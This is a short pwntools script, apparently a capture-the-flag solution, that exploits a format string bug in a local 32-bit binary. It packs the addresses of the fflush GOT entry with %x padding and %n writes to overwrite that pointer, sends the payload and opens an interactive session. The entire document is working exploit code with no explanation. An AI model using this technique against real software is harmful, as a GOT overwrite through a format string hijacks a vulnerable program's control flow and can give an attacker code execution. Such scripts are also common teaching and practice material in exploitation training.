from pwn import *

target = process('./32_new')
#gdb.attach(target, gdbscript='b *0x080487dc')

fflush_adr0 = p32(0x804a028)
fflush_adr1 = p32(0x804a029)
fflush_adr2 = p32(0x804a02b)

flag_val0 = b"%185x"
flag_val1 = b"%892x"
flag_val2 = b"%129x"

fmt_string0 = b"%10$n"
fmt_string1 = b"%11$n"
fmt_string2 = b"%12$n"

payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + flag_val0 + fmt_string0 + flag_val1 + fmt_string1 + flag_val2 + fmt_string2

print(f"Payload len {len(payload)}")

target.sendline(payload)

target.interactive()